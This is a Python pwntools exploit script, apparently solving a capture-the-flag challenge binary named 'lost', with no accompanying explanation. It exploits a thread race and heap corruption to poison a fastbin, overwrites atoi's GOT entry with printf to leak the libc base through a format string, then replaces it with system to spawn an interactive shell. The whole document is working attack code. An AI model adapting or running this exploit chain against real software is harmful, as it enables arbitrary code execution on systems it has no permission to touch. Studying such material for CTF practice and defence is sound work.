#!/usr/bin/python

from pwn import *

def cmd_add(times, **arg):
   ru('>> ')
   sl('1')
   ru('How many chunks at a time (1/2) ? ')
   sl(str(times))
   if times == 2:
      # thread-1
      ru('\nEnter Size 1: ')
      sl(str(arg['size'][0]))
      ru('\nEnter Author name : ')

      time.sleep(5)

      # thread-2
      ru('\nEnter Size 2: ')
      sl('10000')
      ru('\nEnter Size 2: ')

      time.sleep(5)

      # thread-1
      ss(arg['author'][0])
      ru('\nEnter Data 1: ')
      gdb.attach(s,'b* 0x400d39')
      ss(arg['data'][0])
      ru('\nData entered\n')

      # thread-2
      sl(str(arg['size'][1]))
      ru('\nEnter Author name : ')
      ss(arg['author'][1])
      ru('\nEnter Data 2: ')
      ss(arg['data'][1])
      ru('\nData entered\n')

   else :
      # thread-1
      ru('\nEnter Size 1: ')
      sl(str(arg['size']))
      ru('\nEnter Author name : ')
      sl(arg['author'])
      ru('\nEnter Data 1: ')
      sl(arg['data'])
      ru('\nData entered\n')

def cmd_edit(data):
   ru('>> ')
   sl('2')
   ru('Enter new data: ')
   ss(data)



s = process('./lost')

context.log_level = 'debug'
ru = s.recvuntil
rl = s.recvline
rr = s.recv
sl = s.sendline
ss = s.send

atoi_got = 0x602088
printf_plt = 0x400970

cmd_add(1, size=0x270, author='a'*0x6e, data='0' * 0x270)  # 0x300
cmd_add(1, size=0x270, author='a'*0x6e, data='0' * 0x270)  # 0x600
cmd_add(1, size=0x270, author='a'*0x6e, data='0' * 0x270)  # 0x900
cmd_add(1, size=0x270, author='a'*0x6e, data='0' * 0x270)  # 0xc00
cmd_add(1, size=(0x270 - 0x120), author='a'*0x6e+'\x00', data='0' * (0x270-0x120)) # 0xf00 - 0x120

pay = ''
pay += 'a'*0x10
pay += p64(0) + p64(0x21)
pay += 'a' * 0x10
pay += p64(0) + p64(0xc1)

cmd_add(2, size=[0x10, 0x10], author=['a'*0xe+'\x00', 'b'*0xe+'\x00'], data=[pay, 'b'*0x10])

pay2 = ''
pay2 += 'A' * 0x20
pay2 += p64(0) + p64(0x71)
pay2 += p64(0x6020dd)
'''
0x6020d0 <stdin@@GLIBC_2.2.5>: 0x7ffff7bb48e0 <_IO_2_1_stdin_>    0x0
0x6020e0 <stderr@@GLIBC_2.2.5>:    0x7ffff7bb5540 <_IO_2_1_stderr_>   0x0
0x6020f0 <ptr>:    0x603010   0x603030
0x602100 <size>:   0x1    0x0
0x602110:  0x0    0x0
'''

cmd_add(2, size=[0x20, 0x20], author=['a'*0xee+'\x00', 'b'*0xee+'\x00'], data=[pay2, 'b'*0x40])

cmd_add(1, size=0x60, author='c' * 0x10+'\x00', data='A'*0x60)
pay3 = ''
pay3 += '\x00' * 3
pay3 += p64(atoi_got)
pay3 += p64(0)
pay3 += p64(8)

cmd_add(1, size=0x60, author='d' * 0x10+'\x00', data=pay3)
cmd_edit(p64(printf_plt))
ru('>> ')
sl('%7$p\n')
libc_base = int(rl(False), 16) - 0x0000000000070ad2
print hex(libc_base)
libc_system = libc_base + 0x456a0
ru('Invalid\n')

# cmd edit
ru('>> ')
sl('aa')   # printf("aa") = 2 = menu2
ru('Enter new data: ')
ss(p64(libc_system))

ru('>> ')
sl('sh')

s.interactive()
s.close()